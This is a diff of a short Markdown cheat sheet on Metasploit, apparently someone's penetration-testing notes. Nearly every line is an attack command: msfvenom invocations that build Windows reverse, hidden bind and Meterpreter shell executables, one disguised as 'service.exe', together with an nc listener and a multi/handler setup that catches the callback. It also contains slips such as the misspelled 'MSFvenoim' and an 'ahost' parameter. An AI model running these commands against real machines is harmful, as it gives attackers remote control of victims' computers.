@@ -14,16 +14,13 @@
 - `shell`  get a shell on remote machine
 
 # MSFvenoim
-WINDOWS reverse shell
-- get ip `ip a`
-- `msfvenom -p windows/shell_reverse_tcp lhost=$IP lport=443 -f exe > shell.exe`
-- `nc -lvnp 443`
-
-msfvenom -p windows/shell_hidden_bind_tcp ahost=192.168.1.224 lport=443 -f exe > bind.exe    
-
-# Getting a meterpreter shell
+## Make shell
+- get public ip `curl ifconfig.me`
+- `msfvenom -p windows/meterpreter/reverse_tcp lhost=$IP lport=443 -f exe > service.exe`
+## Getting a meterpreter shell
 - `use exploit/multi/handler`
-- `set payload`
+- `set payload windows/meterpreter/reverse_tcp`
+-  `set lhost $IP`
 - `lport 443`
 - `exploit`
 
